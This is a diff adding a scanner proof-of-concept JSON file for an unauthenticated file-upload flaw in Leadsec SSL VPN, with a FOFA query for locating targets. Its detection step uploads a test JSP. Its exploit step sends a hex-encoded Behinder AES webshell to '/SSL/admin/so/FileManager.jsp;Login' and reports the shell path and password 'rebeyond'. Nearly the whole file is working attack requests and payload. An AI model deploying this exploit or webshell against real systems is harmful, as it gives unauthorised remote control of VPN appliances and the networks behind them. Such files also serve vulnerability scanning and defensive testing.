@@ -1,0 +1,135 @@
+{
+  "Name": "Leadsec SSL VPN file upload getshell",
+  "Description": "The attacker can directly access the Leadsec SSL VPN backend and then access the upload page to upload files without logging in.",
+  "Product": "Leadsec-SSL-VPN",
+  "Homepage": "http://www.leadsec.com.cn/",
+  "DisclosureDate": "2021-03-14",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Leadsec-SSL-VPN\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/SSL/admin/so/FileManager.jsp;Login",
+                        "follow_redirect": false,
+                        "header": {
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                              "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                              "Accept-Encoding": "gzip, deflate",
+                              "Content-Type": "multipart/form-data; boundary=---------------------------14363957691640013656756907147",
+                              "Content-Length": "523",
+                              "Connection": "close",
+                              "Cookie": "JSESSIONID=E30BF5A223214F728E6C669FB6FC2FEE",
+                              "Upgrade-Insecure-Requests": "1"
+                        },
+                        "data_type": "hexstring",
+                        "data": "2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134370D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D22424153455F4E414D45220D0A0D0A2F73736C2F746F6D6361742F776562617070732F53534C0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134370D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2275706C6F616446696C65223B2066696C656E616D653D22616C692E6A7370220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A3C2520537472696E67207374723D2268656C6C6F2C776F726C64223B206F75742E7072696E7428737472293B20253E0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134370D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D227375626D6974220D0A0D0A0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D31343336333935373639313634303031333635363735363930373134372D2D0D0A"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/SSL/ali.jsp",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "hello,world",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/SSL/admin/so/FileManager.jsp;Login",
+                        "follow_redirect": false,
+                        "header": {
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                              "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+                              "Accept-Encoding": "gzip, deflate",
+                              "Content-Type": "multipart/form-data; boundary=---------------------------14363957691640013656756907147",
+                              "Content-Length": "523",
+                              "Connection": "close",
+                              "Cookie": "JSESSIONID=E30BF5A223214F728E6C669FB6FC2FEE",
+                              "Upgrade-Insecure-Requests": "1"
+                        },
+                        "data_type": "hexstring",
+                        "data": "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d31343336333935373639313634303031333635363735363930373134370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d22424153455f4e414d45220d0a0d0a2f73736c2f746f6d6361742f776562617070732f53534c0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d31343336333935373639313634303031333635363735363930373134370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616446696c65223b2066696c656e616d653d22616c692e6a7370220d0a436f6e74656e742d547970653a20696d6167652f6a7065670d0a0d0a3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d31343336333935373639313634303031333635363735363930373134370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d227375626d6974220d0a0d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d31343336333935373639313634303031333635363735363930373134372d2d0d0a"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": ["output|define|variable|Webshell: {{{fixedhostinfo}}}/SSL/ali.jsp\nPassword: rebeyond\nWebshell tool: Behinder v3.0"]
+            }
+      ],
+  "Tags": ["getshell"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Leadsec-SSL-VPN"]
+  },
+  "Disable": true
+}
